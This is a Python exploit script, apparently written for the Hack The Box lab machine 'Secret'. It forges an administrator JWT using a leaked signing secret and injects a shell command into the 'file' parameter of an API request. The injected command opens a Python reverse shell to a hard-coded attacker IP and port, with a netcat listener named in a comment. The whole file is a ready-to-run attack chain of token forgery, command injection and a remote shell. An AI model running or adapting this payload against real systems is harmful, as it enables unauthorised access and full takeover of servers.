#!/usr/bin/python3

import jwt
import requests
import pyfiglet
from colorama import Fore, Back, Style

def banner(text="autopwn"):
    print(Fore.RED + pyfiglet.figlet_format(text, font="banner"))
    print(Fore.GREEN + "[+] Author: @dugisan3rd")
    print("[+] Medium: Hack the Box")
    print("[+] Link: https://app.hackthebox.com/machines/408")
    print("[+] Machine: Secret")
    print("[+] Vulnerability: exec() Remote Code Execution\n" + Style.RESET_ALL)

# Change your IP and port
# Run in terminal -> nc -nvlp 9999
LHOST = "10.10.14.60"
LPORT = 9999

url = "http://10.10.11.120/api/logs?file=;python2 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{0}\",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'".format(LHOST, LPORT)

# token retrieved through ".git"
token = "gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE"

encoded_jwt = jwt.encode({"id": "dugisan3rd","name": "theadmin","email": "root@dasith.works"}, token, algorithm="HS256")

if __name__ == "__main__":
    banner()
    r = requests.get(url, headers={"auth-token": encoded_jwt})
    print(r.status_code)
    if r.status_code == 200:
        print("[+] Payload successfully sent. Please check your listener")
    else:
        print("[+] Error")